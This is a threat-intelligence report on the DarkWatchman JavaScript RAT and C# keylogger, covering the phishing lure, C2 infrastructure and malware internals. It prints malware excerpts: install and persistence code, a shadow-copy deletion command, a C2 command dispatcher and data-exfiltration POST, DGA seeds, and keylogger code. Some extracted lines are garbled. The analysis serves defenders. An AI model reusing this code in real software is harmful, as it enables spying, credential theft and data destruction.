{
    "id": "6172d0cf-f335-4e03-b383-5ea255a011bf",
    "created_at": "2023-01-12T15:01:06.133027Z",
    "updated_at": "2025-03-27T02:05:41.41524Z",
    "deleted_at": null,
    "sha1_hash": "93eff4e43a92d702567c4ba55408ee8f3207fc15",
    "title": "2021-12-14 - DarkWatchman- A new evolution in fileless techniques",
    "authors": "",
    "file_creation_date": "2022-05-28T19:51:44Z",
    "file_modification_date": "2022-05-28T19:51:44Z",
    "file_size": 2801991,
    "plain_text": "# DarkWatchman: A new evolution in fileless techniques.\n\n**prevailion.com/darkwatchman-new-fileness-techniques/**\n\n14 December 2021\n\n**Authored by: Matt Stafford and Sherman Smith**\n\n**_Executive summary:_**\n\n\nDecember 14, 2021\n\n\nIn late November, Prevailion’s Adversarial Counterintelligence Team (PACT) identified what appeared to be a malicious javascript-based\nRemote Access Trojan (RAT) that uses a robust Domain Generation Algorithm (DGA) to identify its Command and Control (C2) infrastructure\nand that utilizes novel methods for fileless persistence, on-system activity, and dynamic run-time capabilities like self-updating and\nrecompilation. This RAT, which PACT refers to by its internal codename “DarkWatchman”, has been observed being distributed by email and\nrepresents an evolution in fileless malware techniques, as it uses the registry for nearly all temporary and permanent storage and therefore\n\n\n-----\n\ne e tes a yt g to d s, a o g t to ope ate be eat o a ou d t e detect o t es o d o ost secu ty too s C as e e se\nengineered the DGA, dynamically analyzed the malware, investigated the Threat Actor’s (TA) web-based infrastructure, and consolidated the\nresults of our analysis into the following report.\n\n**_I. Introduction & Investigatory Workflow:_**\n\n[PACT initially caught the scent of this activity via a TLS certificate on the abuse.ch SSLBL for the domain name “bfdb1290[.]top”. The domain](https://sslbl.abuse.ch/)\nhad a Let’s Encrypt cert, was using the nameservers ns1.openprovider[.]nl, ns2.openprovider[.]be, ns3.openprovider[.]eu, and was hosted on\nIP “91[.]208.206.44:443”, which is associated with ALEXHOST S.R.L. in Moldova.\n\nFortunately, a [malicious sample was linked to the blacklisted certificate via VirusTotal, which allowed PACT to pivot into the sample as well as](https://sslbl.abuse.ch/ssl-certificates/sha1/1cf9050f75c9310e5961fecda4202870d5e3ace7/)\nanother associated domain: “a3698d83[.]top”, hosted on Bulgarian IP “185[.]177.59.174” and associated with Redcluster LTD as part of\nBulgarian ISP Belcloud LTD’s network. On 4 December 2021, as PACT’s investigation was underway, analysts observed the TA register an\nadditional domain on this IP: “3a60dc39[.]top”; this domain will become pertinent as this report unfolds below.\n\nAs PACT continued analyzing the sample and the web-based infrastructure used by the TA, it became necessary to construct a timeline of\nobserved activity in order to build context and assist with identifying further usage of the RAT in the hopes of gaining a more robust\nunderstanding of it and the TA (as well as to assist in analysis of victimology and/or dissemination vector). PACT chose to base the timeline\npartially on the timestamps of VirusTotal submissions of the samples and relationships to the observed web infrastructure. Timeline analysis\n[did indeed prove to be valuable, as full email messages were identified that included intact headers that allowed PACT analysts to identify a](https://www.virustotal.com/gui/file/03af3bd4161f55797f597c0ab36a78342556fe7c578a7fc161ad5789eaa109f1)\nspoofed sender, what is likely the true sender, the intended recipient, the attachment that was identified as the ZIP file containing the malicious\nlogic that functions as a dropper for the RAT, and Russian-language subject and body of the email. Taken together, these observations\nindicate it is likely that this email is a targeted lure used to spearphish the recipient.\n\nThe email’s subject was “Free storage expiration notification” and was designed to appear as if it came from “ponyexpress[.]ru” – see Figure 1,\nbelow.\n\nFigure 1: spoofed email headers.\n\nThe body of the email, machine translated from the original Russian and included in full later in this report, contained additional lure material\nthat one would likely anticipate after reading the subject. Notably, it referenced the (malicious) attachment, an expiration of free storage, and\nclaimed to be from Pony Express (thus further reinforcing the spoofed sender address).\n\nHowever, an analysis of the email headers indicate that the message originated from the “rentbikespb[.]ru” domain as evidenced by the\nfollowing header: “Received: from rentbikespb[.]ru (smtp.rentbikespb[.]ru [45[.]156.27.245])”; meaning that the sender is likely spoofed. PACT\nused an automated header analysis tool to corroborate this finding, as seen below in Figure 2:\n\nFigure 2: true sender identity\n\nTaken together, the VirusTotal submissions of the samples, the samples themselves, the ZIP containing the samples (observed as a\ndissemination mechanism via email attachment), as well as the RAR container (seen later in this report under the Analysis section) form a\ntimeline beginning on 12 November:\n\n**TIMESTAMP** **HASH (SHA256)** **FILENAME**\n\n\n2021-11-12\n12:31:12\n\n\n409839f9c8327eff6208aeca4f7113f5a0abdfa97f266f404b14f9fa6ab1432f Накладная №12-6317-3621.exe\n\n\n-----\n\n2021-11-12\n20:49:52\n\n2021-11-15\n0:24:34\n\n2021-11-15\n0:44:23\n\n2021-11-15\n1:10:38\n\n2021-11-15\n1:28:57\n\n2021-11-15\n3:00:41\n\n2021-11-15\n4:06:55\n\n2021-11-15\n4:17:55\n\n2021-11-15\n4:47:24\n\n2021-11-15\n5:28:07\n\n2021-11-15\n5:28:28\n\n2021-11-15\n5:37:43\n\n2021-11-15\n5:38:52\n\n2021-11-15\n5:39:53\n\n2021-11-15\n7:38:09\n\n2021-11-15\n12:04:09\n\n2021-11-15\n12:14:13\n\n2021-11-15\n12:21:03\n\n2021-11-16\n2:06:00\n\n2021-11-16\n23:07:14\n\n\n27c4e9f01e5142a021329163b074f0692a9b4e832e0b53a5e31d364fdbbcdef8 Накладная №12-6317-3621.zip\n\na81d318f2d4caf23c50f3c280f88af3e3598dc1886711ff07f69371e41c924e4 mime-part–92187-14076.zip\n\nce1eee6b86bbc352e9ad69b7e241dd7cf08dc60ced259087f72c33396f65093b Накладная №12-6317-3621.exe\n\nee9cd9a5ac70f7b55b52c02f54fd53186c294a940b2502bbe427d847dde83c85 134121811.js\n\n74c85df7a1f1af78fde252e52d0bfbdec75a626f613f080bd3ca8e3feee34ce5 [0]\n\n003ef083b27eb13b5ca6a39a7aaed359c5e7dae5a872cb569cdf69332bb56ad3 Накладная №12-6317-3621.exe\n\ne8681efd888395026e420acffe3df7b45e990d0a917aec3f09c741d4d8ccfba6 Накладная №12-6317-3621.exe\n\nb1d778643cd6667502c8fc7ff8a6f975420621cd929ee8bd2b1ff23d832eb8fe Накладная №12-6317-3621.zip\n\n4aaee9f71d5f79d8d56c2e7d064cd45674f7bd6a0906ea635573bff83bd24e0b Накладная №12-6317-3621.zip\n\n671ede00b5be118bab9238386fd3f7502ffa21f678d8f509b181d4a819524525 Уведомление об окончании срока бесплатного\n\n03af3bd4161f55797f597c0ab36a78342556fe7c578a7fc161ad5789eaa109f1 b77b41d5636145af853d4120d6be1e89\n\n003ef083b27eb13b5ca6a39a7aaed359c5e7dae5a872cb569cdf69332bb56ad3 file\n\nee9cd9a5ac70f7b55b52c02f54fd53186c294a940b2502bbe427d847dde83c85 file\n\n4aaee9f71d5f79d8d56c2e7d064cd45674f7bd6a0906ea635573bff83bd24e0b file\n\ncd50319f992809ff49f3088f21c5ddf55305c62836997d1849cc350ad659cc98 Накладная №12-6317-3621.zip\n\na81d318f2d4caf23c50f3c280f88af3e3598dc1886711ff07f69371e41c924e4 C:\\Users\\user\\Desktop\\attachments\\Накладная\n\nb1d778643cd6667502c8fc7ff8a6f975420621cd929ee8bd2b1ff23d832eb8fe C:\\Users\\user\\Desktop\\attachments\\Накладная\n\na81d318f2d4caf23c50f3c280f88af3e3598dc1886711ff07f69371e41c924e4 C:\\Users\\user\\Desktop\\attachments\\Накладная\n\n3ac186a43d6e877b3804d2b56762f928b2cd2bd0e57225e8418082f4e05a10fb 671ede00b5be118bab9238386fd3f7502ffa21f678\n\n4aaee9f71d5f79d8d56c2e7d064cd45674f7bd6a0906ea635573bff83bd24e0b Накладная №12-6317-3621.zip\n\n\nFurther investigation by PACT identified users of a Russian-speaking automotive forum discussing this particular lure on 15 November 2021, in\nthe context of opening an email with the attached lure document, which corroborates PACT’s timeline as well as PACT’s assessment that this\nemail was part of a spearphishing operation. Further analytic confidence for this assessment was bolstered by the fact that the targeted\norganization, which has been redacted from Prevailion’s public findings but was identified by PACT via the extracted email headers, appears to\nhost numerous subdomains that may indicate it is an enterprise-sized organization.\n\nPivoting on the true sender domain (“rentbikespb[.]ru”) and IP (“45[.]156.27.245”) led PACT to several notable findings:\n\n1. At the time of analysis (early through mid-December), the domain “rentbikespb[.]ru” pointed to “mail[.]ru”/”94[.]100.180.200, not the\n\nsending IP “45[.]156.27.245” or a generic park page as one would expect. As far as PACT can tell, this is not due to any relation or\nassociation between the domains but may be due to the “rentbikespb[.]ru” being “parked” by the TA, or otherwise put on ice until it is\nviable for operational use.\n\n\n-----\n\np S a a ys s d cates t at t e se d g do a, e tb espb[ ] u, appea s to a e eso ed to a [ ] u / 9 [ ] 00 80 00 o _ost o_\n_its existence, and has only briefly resolved to the sending IP (“45[.]156.27.245”) for operational use; afterwards, it is pointed back to_\n“mail[.]ru”/”94[.]100.180.200.\n3. Further pDNS analysis indicates that the IP that hosted the “rentbikespb[.]ru” domain at the time the spoofed email was sent,\n\n“45[.]156.27.245”, has hosted many mail-themed subdomains on several dozen domains during 2021; a subset of which can be seen in\nthe following table:\n\n**FIRST SEEN** **LAST SEEN** **FQDN** **RESOLVED IP**\n\n2021-02-26 2021-02-26 smtp.673900[.]ru 45[.]156.27.245\n\n2021-02-26 2021-02-26 antispam.shiptechnology[.]ru 45[.]156.27.245\n\n2021-02-26 2021-02-26 mail.shiptechnology[.]ru 45[.]156.27.245\n\n2021-04-13 2021-04-13 mailx.psart[.]ru 45[.]156.27.245\n\n2021-04-20 2021-04-20 mail2.vulkandlypotencii[.]ru 45[.]156.27.245\n\n2021-04-20 2021-04-20 mx2.vulkandlypotencii[.]ru 45[.]156.27.245\n\n2021-04-20 2021-04-20 mx7.vulkandlypotencii[.]ru 45[.]156.27.245\n\n2021-04-20 2021-04-20 relay1.vulkandlypotencii[.]ru 45[.]156.27.245\n\n2021-07-13 2021-07-14 mail.website-co-jp[.]shop 45[.]156.27.245\n\n2021-10-25 2021-10-25 pop3.tjsamy[.]cn 45[.]156.27.245\n\n2021-11-10 2021-11-13 mail.rentbikespb[.]ru 45[.]156.27.245\n\n2021-11-14 2021-11-15 smtp.rentbikespb[.]ru 45[.]156.27.245\n\n2021-11-24 2021-11-27 smtp.e2cs3v6[.]cn 45[.]156.27.245\n\nPACT did not further investigate these findings or historic resolutions, and only includes them here in the interest of completeness and perhaps\nto further the analytic and investigative capacity of the information security community at large.\n\nAt this time, it may benefit the reader to summarize the findings of PACT’s analysis to this point: starting on November 12th, 2021, samples\nassociated with a novel Javascript-based RAT were seen uploaded to VirusTotal. Along with these samples, full emails were uploaded that\nappear to have included the full dissemination vector: spearphishing emails spoofed to appear as though the sender was “ponyexpress[.]ru”\n(but was, in actuality, “smtp.rentbikespb[.]ru”) that were socially engineered to capitalize on a lure based on a “Free storage expiration\nnotification” with the eventual goal of getting the targeted user to download and execute the malicious attachment (a ZIP file).\n\n**_II. Analysis of Malicious Software:_**\n**IIa. Overview**\n\nDarkWatchman is a ‘fileless’ JavaScript RAT paired with a C# keylogger. Both parts of the malware are lightweight, with the JavaScript coming\nin at just under 32kb and the compiled keylogger only taking up 8.5kb total. It contains several advanced, and notable, features that set it apart\n[from most commodity malware. DarkWatchman heavily utilizes LOLbins and some novel methods of data transfer between modules to avoid](https://lolbas-project.github.io/)\ndetection. Various parts of DarkWatchman, including configuration strings and the keylogger itself, are stored in the registry to avoid writing to\ndisk. The initial sample that PACT analyzed appears to be targeting a Russian-speaking person or organization, but the script itself is written\nwith English variable and function names. Based on some of the features, PACT assesses with moderate confidence that this is an initial\naccess tool for use by ransomware groups or affiliates.\n\n**IIb. Analysis**\n\nPACT acquired the initial DarkWatchman sample from a Virustotal API upload of an email message. The message was written in Russian and\npurported to be PonyExpress with an attached invoice. The email headers revealed that it was spoofed and sent from rentbikespb[.]ru. Scans\nfrom Shodan and other sources indicate that this domain was updated to point at a server instance hosted at OpenStack running Postfix and\nchanged back to the original IP shortly after the email was sent, on or around November 14th, 2021.\n\n\n-----\n\nFigure 3: Email header analysis\n\n**IIb(i). Delivery Mechanism and Methodology**\n\nThe email indicates that the target has a package that is being held for them and will exceed the free storage period soon, and instructs them\nto see the attached scanned copy of the “consignment note”:\n\nFigure 4: Screenshot of email. (machine translation below:)\n\nThis letter is to inform you that on November 16, 2021, the free storage period for consignment note #12-6317-3621 is about to expire. Since\nthe recipient’s phone number indicated in the shipment is not available, please contact us at +7-495-937-77-77 (multichannel). Please note\nthat in case the item cannot be delivered and the receiver can not be reached by November 16, 2021 the item will be returned to the sender. A\nscanned copy of the consignment note completed by the sender is attached to this letter.\n\nRespectfully, Michael, PONY EXPRESS Account Manager, +7-495-937-77-77 ext. 308.\n\nPACT was able to identify ‘patient zero’ in this attack based on a post by the recipient on a Russian automotive forum the day the email was\nsent. The recipient indicated that they opened the attachment since they do, indeed, have a business relationship with Pony Express and that\nthey would have expected a bill of lading from the company. This may indicate that this was a targeted malspam campaign and not a random\ndecision on the part of the threat actor.\n\n\n-----\n\n“15 November, 13:42I got a letter from Ponyexpress, we work with them on the contract.order is not delivered on time comes out the bill of\nlading inside, well, shit, and opened the archive.\n\nNow Nod is constantly swearing that blocked the page bfdb1290.top 91.208.206.44\n\nI wiped the registry, but Nod is still periodically swearing\n\nwhere to look for it ?”\n\n“15 November, 13:57Re: yeah, I’m totally stupid… I’m not used to this stuff, it was an executable, I couldn’t see the extension in the open\nwindow”\n\n“15 November, 14:13I found this registry file… it won’t uninstall”\n\n(Figures 5-7: Apparent victim posts on Russian automotive forum. All translations are machine generated.)\n\nThe email attachment is a zip archive named ‘Накладная №12-6317-3621.zip’ (translated: Invoice #12-6317-3621) which contains an\nexecutable with the same name (‘Накладная №12-6317-3621.exe’). The executable’s icon is set to appear to be a basic text document. This\nexecutable is a WinRAR SFX self installing archive that contains two files: ‘134121811.js’ (the JavaScript RAT) and ‘2204722946’ (the C#\nsource code for the keylogger). The WinRAR SFX configuration file contains comments in Russian and instructions to drop both files in\n%TEMP% before executing the .JS file with the name of the WinRAR SFX executable as a command line argument.\n\n\n-----\n\nFigure 8: WinRAR SFX configuration\n\n**IIb(ii). JavaScript RAT**\n\nUpon initial execution, the Windows Registry is checked to determine if DarkWatchman has already been installed. The malware stores its\nconfiguration in ‘\\\\HKCU\\Software\\Microsoft\\Windows\\DWM\\‘, using registry keys that consist of a uid generated from the serial number of the\nC: drive and appended with a single digit or character. Installation is denoted by uid + 0 (eg: abc1230) – if the malware does not find a ‘1‘ flag\nin this key, it runs its install function.\n```\nfunction get_uid() {\n  var sn = false;\n  try {\n   sn = get_uid2();\n   if (sn != false) sn = sn.toLowerCase();\n  }\n  catch (e) { }\n   if (sn) {\n    while (sn.length < 8) sn = '0' + sn;\n    return sn;\n   }\n   else return '00000000';\n   }\n\n```\nFigure 9: UID Generation Function\n```\nfunction entry_point() {\n init_globals();\n if (cfg_param_exists(uid + 0)) start_instance(); else \n  install();\n }\n\n```\nFigure 10: entry_point function\n\nThe install function proceeds to delete the WinRAR SFX executable using the filename passed to it during execution. It also moves the JS file\nto ‘Shell.NameSpace(28)’ (‘ssfLOCALAPPDATA’ – ‘\\AppData\\Local’) and creates a scheduled task to use WScript to execute the file at every\nuser log on. The installation routine then copies the keylogger to the registry, sets the uid + 0 flag to 1 to indicate that installation was\ncompleted, and executes the scheduled task it created. The last step is a popup that informs the user “Unknown Format”, giving the indication\nthat the file is unreadable by the system to deflect from the ‘scanned document’ not opening.\n\n\n-----\n\n```\nfunction install() {\n try {\n  if (wsa.count() > 0) {\n   var sfx = wsa(0);\n   if (fso.FileExists(sfx)) erase_file(sfx);\n   }\n } catch (e) { }\n var f = shell_application.NameSpace(28);\n if (f != null) {\n  var installed_filename = f.Self.Path + '\\\\' + uid + '0.js';\n  if (move_file(self_file, installed_filename)) {\n   var task_name = gen_guid(0);\n   if (create_autostart_task(task_name, 'wscript.exe', '\"' + installed_filename + '\"', admin)) {\n    keylogger_to_registry();\n    cfg_set_param(uid + 0, 1);\n    start_task(task_name);\n    }\n   if (admin) reset_restore_points();\n   }\n  }\n wscript_shell.Popup('Unknown format.', 30, 'Error', 0);\n}\n\n```\nFigure 11: Install Function\n\nFigure 12: Scheduled Task for persistence\n\nWhen DarkWatchman is run and detects the presence of the “installed” flag, it begins regular operation.\n\n**IIb(iii). Capabilities / Notable Functionality**\n\nDarkWatchman is capable of most basic RAT functionality:\n\nExecute EXE files (with or without the output returned)\nLoad DLL files\nExecute commands on the command line\nExecute WSH commands\nExecute miscellaneous commands via WMI\nExecute PowerShell commands\nEvaluate JavaScript\nUpload files to the C2 server from the victim machine\nRemotely stop and uninstall the RAT and Keylogger\nRemotely update the C2 server address or call-home timeout\n\n\n-----\n\ns e as so e otab e u ct o a ty\n\nUpdate the RAT and Keylogger remotely\nSet an autostart JavaScript to run on RAT startup\nA Domain Generation Algorithm (DGA) for C2 resiliency\nIf the user has admin permissions, it deletes shadow copies using vssadmin.exe\n```\nfunction reset_restore_points() {\n wscript_shell.Run('vssadmin.exe Delete Shadows /All /Quiet', 2, false);\n}\n\n```\nFigure 13: Deletion of shadow copies if run as administrator\n\nAlong with the JavaScript RAT, DarkWatchman features a C# keylogger. The keylogger is distributed as obfuscated C# source code that is\nprocessed and stored in the registry as a Base64-encoded PowerShell command. When the RAT is launched, it executes this PowerShell\nscript which, in turn, compiles the keylogger (using CSC) and executes it. The keylogger itself does not communicate with the C2 or write to\ndisk. Instead, it writes it’s keylog to a registry key that it uses as a buffer. During its operation, the RAT scrapes and clears this buffer before\ntransmitting the logged keystrokes to the C2 server.\n\n**IIb(iv). General Operation**\n\nDarkWatchman runs through a standard set of operations on startup, and then continues to loop through a smaller group of functions on a\nregular basis to feed information back to the C2 server and get new commands. When initially executed by the scheduled task, DarkWatchman\nchecks the registry for an autostart JavaScript snippet and if one exists evaluates it. Next, it compiles and executes the keylogger. The DGA\nfunction is then used to determine the daily C2 server name and this is stored in the registry. A function (titled ‘srv_send_info()’) then scrapes\ninformation about the victim machine – OS, processor architecture, OS locale, if the victim is part of a domain (and it’s domain role), the victim\nmachine’s time zone, the username and computer name (taken from ‘WScript.Network‘), a list of installed Antivirus products, and a list of\nsigned PnP Drivers for Smartcard Readers – and sends it to the C2 server.\n\nThe malware then checks to see if uid + ‘p’ exists in the registry, and if it doesn’t, runs ‘collect_user_profile()‘ which gathers the IE, Firefox,\nChrome, and Yandex histories, and stores ‘Shell.NameSpace(36)‘ (‘ssfWINDOWS‘ or the Windows working directory) in a variable called\n‘win_dir‘. This function also scans the drive root (‘C:\\‘) file and folder names. The scraped browser data is stored in the registry and sent to the\nC2 server.\n\nNext, DarkWatchman checks for uid + ‘h’ and, if it does not exist and the OS uptime (collected using WMI from ‘Win32_OperatingSystem‘) is\nless than 10 minutes, it kills the processes and clears the history for IE, Firefox, Chrome, and Yandex. uid + ‘h’ is updated to prevent doing this\nagain during this session.\n\nOnce this is complete, DarkWatchman moves into a loop in which it waits for the set timeout, checks uid + ‘z’ to determine if it should be\nstopped, checks uid + ‘r’ (which does not appear to be set anywhere in the script), and checks uid + ‘j’ for JavaScript to evaluate. The last step\nof the loop is to collect the buffer from the keylogger from the registry (stored in uid + ‘a’) and send it to the server.\n\n**IIb(v). C2 Communication**\n\nC2 communication is handled with a basic POST to the C2 server. Every command the RAT runs during the loop above sends the result to the\nC2, and in response it can receive further commands to execute. DarkWatchman’s server communication is handled through\n‘WinHttpRequest.5.1‘ and includes the following headers:\n\n**Header** **Value**\n\nContent-Type application/x-www-form-urlencoded\n\nUser-Agent Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.1) like Gecko\n\nX-Client-Id The generated uid (see Figure 9)\n\nX-Client-Controller The action taken\n\nX-Client-Ut The OS’s timezone\n\nX-Client-Status A status code passed from the command executed, if provided\n\n_Table of Header Information_\n\nOne item of note is that the user-agent string above is similar to, but not accurate for, Internet Explorer 11. The user-agent string for that\nbrowser is ‘Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko’. This presents a detection opportunity as it is not a\ncommon user-agent despite being designed to look like one.\n\n\n-----\n\nttp equest Opt o ( ) (a a ttp equestOpt o _Ss o g o e ags ) s set to 0 0 00 0 0 00 0 000 0 000, d cat g\n“Unknown CA or Untrusted Root” (‘0x0100’), “Wrong Usage” (‘0x0200’), “Invalid CN” (‘0x1000’), and “Invalid date or certificate expired”\n(‘0x2000’) allowing it to ignore expired, invalid, or untrustworthy certificates. Along with these headers, the body passed to the C2 server\ncontains the result of whatever command was run – for example, in the case of ‘srv_send_info()‘ the body contains a string containing the\nvictim machine information, slightly obfuscated:\n```\nvar data = 'os=' + bin2hex(os_ver, 0) + '&cn=' + bin2hex(compname, 0) \n +'&un=' + bin2hex(username) + '&b=' + time_bias + '&l=' + os_locale +   \n '&adm=' + adm + '&pd=' + part_of_domain + '&dr=' + domain_role + \n '&av=' +  bin2hex(avs, 0) + '&sc=' + bin2hex(sc, 0);\nsrv_send_data(2, 0, data);\n\n```\nFigure 14: Encoding for ‘srv_send_info()’ function\n```\nPOST /index.php HTTP/1.1\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded; Charset=UTF-8\nAccept: */*\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.1) \n like Gecko\nX-Client-Id: 26b799fa\nX-Client-Controller: 2\nX-Client-Ut: 1935\nContent-Length: 159\nHost: 3a60dc39.top\nos=57696e646f77732031302050726f20414d443634&cn=4445534b544f502d4a474c4c4a4c44&un=61646d696e&b=0&l=enUS&adm=0&pd=0&dr=0&av=57696e646f777320446566656e646572&sc=\n\n```\nFigure 15: Example communication with the C2 from the ‘srv_send_info()’ function\n```\nfunction srv_responce(status, responseBody, responseText) {\n try {\n  switch (status) {\n   case 200: break;\n   case 820: execute_exe(false, responseText, responseBody); break;\n   case 821: load_dll(responseText, responseBody); break;\n   case 822: execute_cmd_line(responseText); break;\n   case 823: execute(responseText); break;\n   case 824: execute_wsh(responseText, responseBody); break;\n   case 825: eval_js(responseText); break;\n   case 826: execute_ps(responseText); break;\n   case 827: stop_self(); break;\n   case 828: uninstall(); break;\n   case 829: upload_file(responseBody); break;\n   case 830: set_timeout(responseText); break;\n   case 831: set_cc_url(responseText); break;\n   case 832: update_self(responseBody); break;\n   case 833: update_keylogger(responseText); break;\n   case 834: set_autostart_js(responseText); break;\n   case 835: execute_exe(true, responseText, responseBody); break;\n   default:\n    return -2;\n    break;\n  }\n }\n catch (e) { return -99; }\n return 0;\n}\n\n```\nFigure 16: ‘srv_responce()’ function\n\nWhile the traffic from the victim to the C2 server remains HTTP/1.1 compliant, the response from the server will either be 200 – telling it to\ncarry on and take no action – or an 8xx response. Each 8xx response maps to a function outlined elsewhere in the RAT and allows the threat\nactor to have some level of control over the victim machine. Beyond the obvious capabilities – loading other malware, stealing files, etc. – the\nC2 can also push updates to DarkWatchman over the wire. These updates can be for either the JS RAT or the keylogger. The C2 server can\nalso provide a new C2 domain, change the timeout between communications, or set a Javascript snippet to automatically run the next time the\nmalware starts. The threat actor can also remotely pass commands to stop the RAT or keylogger, or have them uninstall themselves. Since the\nkeylogger is compiled at runtime, uninstalling the RAT will prevent the keylogger from persisting.\n\n**IIb(vi). DGA**\n\n\n-----\n\na atc a uses a G u ct o to dete e t e pote t a C do a s o t e day e u ct o bu ds a st o 5 0 do a s a d tests\nthem all sequentially until it finds a live server that provides the correct response. This domain is then stored in the registry (uid + ‘c’) and used\nby the malware until the next time it starts, when the function is run again. This C2 domain can be overridden remotely by the threat actor as\nwell. The DGA function starts with a seeded list of 10 domains and generates 500 more using a combination of portions of the standardized\ndate in long format, a salt, and the iteration number. This string is run through two functions: a CRC32 function and a function to convert\nintegers to hex32. This leaves an 8 character string that is appended to the list of seeded domains. Once all 500 have been generated and\nadded to the list, it is passed to a separate function that prepends ‘https://‘ and appends ‘.top/index.php‘ to each domain and tries to connect to\nthe resulting URL. DarkWatchman passes the uid to the potential C2 and expects to receive a ‘200’ response with the uid in the body in return.\nOnce it finds a server that responds in this fashion, it sets this domain in the registry as the current C2 for the day.\n\nThe script checks the registry for the existence of a salt – uid + ‘b’ – but this registry key is never set in the script. It appears this functionality\nwas intended but not included.\n```\nvar url_prefix = 'https:/' + '/';\nvar url_suffix = '.top/index.php';\nvar deafult_salt = 'd46ebd15';\nvar domains = new Array('bfdb1290', 'a3698d83', '3a60dc39', '4d67ecaf', \n 'd303790c', 'a404499a', '3d0d1820', '4a0a28b6', 'dab53527', \n 'adb205b1');\n\n```\nFigure 17: Seeded domain list, default salt, and url prefix and suffix from DGA function\n\nDuring our analysis, PACT found that this DGA had been previously identified by Netlab360 and is currently tracked on their DGA tracker as\n[“tordwm”.](https://data.netlab.360.com/dga/#tordwm)\n\n**IIb(vii). Persistence**\n\nDarkWatchman achieves persistence through a scheduled task. This task is set to run at user log on and execute the script using WScript.\nThis is a simple persistence mechanism compared to some of the more advanced features of the RAT, but it is also a tested and reliable\nmethod of maintaining a foothold. Since the malware regularly changes its C2 server and can be updated remotely, it is safe to assume that\nthis could change over time.\n\n**IIb(viii). C# Keylogger**\n\nDarkWatchman includes a feature complete C# keylogger that is dropped alongside the RAT in text format. The keylogger is provided as C#\ncode and compiled during runtime from a Base64 PowerShell command stored in the registry. The keylogger code itself is obfuscated, with\nboth function and variable names being randomized. However, there is no other obfuscation – no redundant logic or unnecessary functions –\nwhich leaves the entire compiled keylogger at 8.5kb.\n\nDuring installation, the keylogger file is read by the malware and erased. The contents of this file are split, with the first 8 characters containing\nthe parts of the XOR key used to decode the rest. The remainder of the string is passed, two characters at a time, to a function that un-XORs it\nusing one of the four keys extracted in sequential order. The final string is a Base64-encoded Powershell command (see Figure 19.) This\nPowerShell command contains the C# code for the keylogger and the commands to compile it with CSC and execute it.\n```\nfunction keylogger_hex_to_registry(hex_data) {\n var k = new Array();\n for (var i = 0; i < 4; i++) { k[i] = parseInt(hex_data.substr(i * 2, 2), 16); }\n var kl_plain_data = unxor(hex_data.substr(8), k);\n return cfg_set_param(uid + 1, kl_plain_data);\n}\nfunction keylogger_to_registry() {\n if (fso.FileExists(self_dir + '2204722946')) {\n  var kl_hex_data = get_file_content(self_dir + '2204722946', false);\n  erase_file(self_dir + '2204722946');\n  return keylogger_hex_to_registry(kl_hex_data);\n }\n else return false;\n}\n\n```\nFigure 18: Functions to install keylogger to registry\n\n\n-----\n\nFigure 19: Base64 encoded PowerShell command and output\n\nThe keylogger interacts with the JavaScript RAT through the use of three registry keys – uid + ‘a’ as a buffer for captured keystrokes and\nclipboard data, uid + ‘s’ as a flag to tell the keylogger to stop, and uid + ‘m’ which stores the keylogger mutex.\n\n**IIb(ix). Registry Buffer**\n\nThe keylogger component of DarkWatchman captures the input of the low-level keyboard handler (‘WH_KEYBOARD_LL’) and monitors for all\nnon-system keypresses. Writeable keystrokes, as well as delete and backspace, are captured and written to a buffer in the registry (uid + ‘a’).\nCaptured keypresses are appended with a timestamp, the foreground window name, and the process name. The clipboard is also written to\nthis registry when it is captured with “ :: Clipboard” appended to it. During its operating loop, the JavaScript portion of DarkWatchman will grab\nthe contents of this registry key buffer, clear it out, and send it to the server. Using the registry as a buffer for the keylogger allows it to avoid\nwriting to disk or sending the captured keypresses to the server itself, which reduces potential for detection. At the time of this writing,\nVirusTotal had 5/66 detections for the compiled keylogger, and all were generic/automated detections. None identified it as a keylogger.\n\n\n-----\n\n```\nGetWindowText(static_foreground_window, window_text_str_buffer, foreground_window_text_length + 1);\nif ((h201e66b1 != foreground_window_pid) || (static_foreground_window != foreground_window) ||\n(foreground_window_text_length_plus1.ToString() != window_text_str_buffer.ToString())) {\n update_keylogger_buffer_regkey(foreground_window_text_length_plus1, foreground_window_process_name, static_str_builder);\nforeground_window_text_length_plus1.Remove(0, foreground_window_text_length_plus1.Length);\nforeground_window_text_length_plus1.Append(window_text_str_buffer);\nstatic_str_builder.Remove(0, static_str_builder.Length);\nforeground_window = static_foreground_window;\nProcess foreground_window_process_inst = Process.GetProcessById((int) h201e66b1);\nif (foreground_window_process_inst != null) foreground_window_process_name = foreground_window_process_inst.ProcessName;\nelse\n foreground_window_process_name = \"\";\n foreground_window_pid = h201e66b1;\n}\nif (message_int_value > 7) {\n if (is_value_8)\n  static_str_builder.Append(\"[«]\");\n else if (is_value_46)\n  static_str_builder.Append(\"[del]\");\n else\n  static_str_builder.Append(str_buff_builder);\n}\n\n```\nFigure 20: Segment of deobfuscated keylogger code\n\n**IIb(x). List of Registry Keys Utilized**\n\n**Key** **Purpose**\n\nuid + ‘s’ Stop keylogger flag\n\nuid + ‘m’ Keylogger mutex\n\nuid + ‘v’ Autorun JavaScript snippet storage\n\nuid + ‘c’ Current C2 server\n\nuid + ‘t’ Reconnect timeout\n\nuid + ‘a’ Keylogger buffer\n\nuid + ‘0’ Installation flag\n\nuid + ‘p’ collect_user_profile flag\n\nuid + ‘h’ clear_browsers_history flag\n\nuid + ‘j’ JavaScript to evaluate\n\nuid + ‘z’ Stop RAT\n\nuid + ‘b’ DGA salt (not set)\n\nuid + ‘r’ res_data (not set)\n\nuid + ‘1’ Base64 encoded Powershell command used to compile keylogger\n\n_Table of Registry Keys Observed_\n\n_A special thanks to_ _[Lee Archinal for contributing to this section.](https://twitter.com/ArchinalLee)_\n\n**_III. Closing Thoughts & Key Takeaways_**\n\n**IIIa. Analytic Gaps & Anomalous Findings**\n\nPrevailion’s proprietary telemetry as well as the post on the Russian automotive forum regarding the “Pony Express” lure confirmed PACT’s\nhypothesis that DarkWatchman is in current use and likely being used as an initial access and reconnaissance tool. Attribution of\nDarkWatchman was not possible for PACT, but several findings were notable: DarkWatchman appears to be used by criminal actors; it appears\nto have targeted victims within Russia; its lure documents (and comments in the code) are written in Russian; and the mail servers used to\ndisseminate DarkWatchman are located within Russia (and are parked at a Russian internet services company). Small typographical errors\nand misspellings were identified in the code that indicate the 